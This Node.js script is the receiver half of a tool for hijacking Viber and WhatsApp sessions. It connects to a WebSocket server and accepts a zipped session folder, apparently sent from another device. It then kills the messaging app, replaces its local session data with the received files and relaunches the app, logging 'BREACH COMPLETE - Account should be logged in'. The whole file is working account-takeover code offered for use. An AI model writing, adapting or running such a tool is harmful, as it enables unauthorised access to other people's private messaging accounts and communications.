// PC Session Receiver (Standalone Script)
// Usage: node pc-receiver.js
// Note: This is a backup script. The main app uses Electron (main.js)

const WebSocket = require('ws');
const fs = require('fs');
const path = require('path');
const { exec } = require('child_process');
const AdmZip = require('adm-zip');
const os = require('os');

// CONFIGURATION: SERVER IP can be provided via ENV (SERVER_IP), fallback to localhost
const SERVER_IP = process.env.SERVER_IP || '127.0.0.1';
const SERVER_PORT = 8080;

// Load profiles from config.json
let appConfig = null;
try {
    const cfgPath = path.join(__dirname, '..', 'config.json');
    if (fs.existsSync(cfgPath)) {
        appConfig = JSON.parse(fs.readFileSync(cfgPath, 'utf8'));
    }
} catch {}

function resolveProfile(appName) {
    const profiles = (appConfig && appConfig.profiles) || {};
    const name = (appName || 'viber').toLowerCase();
    if (name === 'whatsapp') {
        const def = (appConfig && appConfig.defaults && appConfig.defaults.whatsappProfile) || 'whatsapp_classic';
        return { key: def, data: profiles[def] };
    }
    return { key: 'viber', data: profiles['viber'] };
}

function buildPaths(profile) {
    const home = os.homedir();
    const p = profile.data || {};
    const processName = p.processName || 'Viber.exe';
    const dataPath = p.dataPathRelative ? path.join(home, ...p.dataPathRelative) : path.join(home, 'AppData', 'Roaming', 'ViberPC');
    const backupPath = path.join(home, 'AppData', 'Roaming', (p.backupDirName || 'ViberPC_BACKUP'));
    const exePath = p.exePathRelative ? path.join(home, ...p.exePathRelative) : path.join(home, 'AppData', 'Local', 'Viber', 'Viber.exe');
    return { processName, dataPath, backupPath, exePath };
}

let ws = null;
let currentProfile = buildPaths(resolveProfile('viber'));

console.log('\n═══════════════════════════════════════════════════');
console.log('VIBER SESSION RECEIVER (PC)');
console.log('═══════════════════════════════════════════════════\n');

// Kill Viber process
function killCurrentProcess() {
    return new Promise((resolve) => {
        console.log(`Terminating ${currentProfile.processName} process...`);
        exec(`taskkill /F /IM "${currentProfile.processName}"`, (error) => {
            if (error) {
                console.log('  (Process not running)');
            } else {
                console.log('✓ Process terminated');
            }
            setTimeout(resolve, 1000);
        });
    });
}

// Start Viber
function startCurrentApp() {
    console.log('Launching client...\n');
    
    if (!fs.existsSync(currentProfile.exePath)) {
        console.error('ERROR: Executable not found at:', currentProfile.exePath);
        console.error('Please update config.json with correct exe path\n');
        return;
    }
    
    exec(`"${currentProfile.exePath}"`, (error) => {
        if (error) {
            console.error('ERROR: Failed to launch client:', error.message);
        } else {
            console.log('✓ Client launched successfully!');
            console.log('✓ BREACH COMPLETE - Account should be logged in\n');
        }
    });
}

// Backup current session
function backupCurrentSession() {
    console.log('Creating backup of current session...');
    
    if (fs.existsSync(currentProfile.dataPath)) {
        // Remove old backup
        if (fs.existsSync(currentProfile.backupPath)) {
            fs.rmSync(currentProfile.backupPath, { recursive: true, force: true });
        }
        
        // Copy current session
        fs.cpSync(currentProfile.dataPath, currentProfile.backupPath, { recursive: true });
        console.log('✓ Backup created:', currentProfile.backupPath);
    } else {
        console.log('  (No existing session to backup)');
    }
}

// Install new session
async function installSession(base64Data, appName) {
    try {
        console.log('\n═══════════════════════════════════════════════════');
        console.log('INSTALLING SESSION');
        console.log('═══════════════════════════════════════════════════\n');
        currentProfile = buildPaths(resolveProfile(appName));
        
        // Step 1: Kill Viber
        await killCurrentProcess();
        
        // Step 2: Backup
        backupCurrentSession();
        
        // Step 3: Remove old session
        console.log('Removing old session data...');
        if (fs.existsSync(currentProfile.dataPath)) {
            fs.rmSync(currentProfile.dataPath, { recursive: true, force: true });
            console.log('✓ Old session removed');
        }
        
        // Step 4: Extract new session
        console.log('Extracting new session...');
        
        const zipBuffer = Buffer.from(base64Data, 'base64');
        const tempZip = path.join(os.tmpdir(), 'viber_session.zip');
        fs.writeFileSync(tempZip, zipBuffer);
        
        const zip = new AdmZip(tempZip);
        const extractPath = path.join(os.homedir(), 'AppData', 'Roaming');
        zip.extractAllTo(extractPath, true);
        
        fs.unlinkSync(tempZip);
        console.log('✓ Session extracted:', currentProfile.dataPath);
        
        // Step 5: Launch Viber
        await new Promise(resolve => setTimeout(resolve, 2000));
        startCurrentApp();
        
        console.log('\n═══════════════════════════════════════════════════');
        console.log('INSTALLATION COMPLETE');
        console.log('═══════════════════════════════════════════════════\n');
        
    } catch (error) {
        console.error('\nERROR: Installation failed:', error.message);
        console.error('\nAttempting to restore from backup...');
        
        // Restore from backup
        if (fs.existsSync(currentProfile.backupPath)) {
            if (fs.existsSync(currentProfile.dataPath)) {
                fs.rmSync(currentProfile.dataPath, { recursive: true, force: true });
            }
            fs.cpSync(currentProfile.backupPath, currentProfile.dataPath, { recursive: true });
            console.log('✓ Restored from backup');
            startCurrentApp();
        } else {
            console.error('ERROR: No backup available');
        }
    }
}

// Connect to server
function connectToServer() {
    console.log(`Connecting to server: ws://${SERVER_IP}:${SERVER_PORT}`);
    
    ws = new WebSocket(`ws://${SERVER_IP}:${SERVER_PORT}`);
    
    ws.on('open', () => {
        console.log('✓ Connected to server\n');
        
        // Register as PC
        ws.send(JSON.stringify({ type: 'register', device: 'pc' }));
        
        console.log('Ready to receive session from laptop...');
        console.log('Use the Electron app or trigger from laptop\n');
    });
    
    ws.on('message', async (data) => {
        const message = JSON.parse(data);
        
        // Received session from laptop
        if (message.type === 'install_session') {
            console.log('\n═══════════════════════════════════════════════════');
            console.log('SESSION DATA RECEIVED');
            console.log('═══════════════════════════════════════════════════');
            console.log(`Size: ${(message.data.length / 1024 / 1024).toFixed(2)} MB\n`);
            
            await installSession(message.data, message.app || 'viber');
        }
        
        if (message.type === 'registered') {
            console.log('✓ Registered as PC\n');
        }
    });
    
    ws.on('error', (error) => {
        console.error('\nERROR: Connection failed:', error.message);
        console.error('\nCheck:');
        console.error(`  1. Server is running (node server.js)`);
        console.error(`  2. Server IP is correct: ${SERVER_IP}`);
        console.error('  3. Both devices are on the same network');
        console.error('  4. Firewall allows port 8080\n');
    });
    
    ws.on('close', () => {
        console.log('\nConnection closed\n');
    });
}

// Display info
console.log('\nWARNING: This will replace your current session!');
console.log('A backup will be created automatically if current data exists.');
console.log();

// Start
connectToServer();
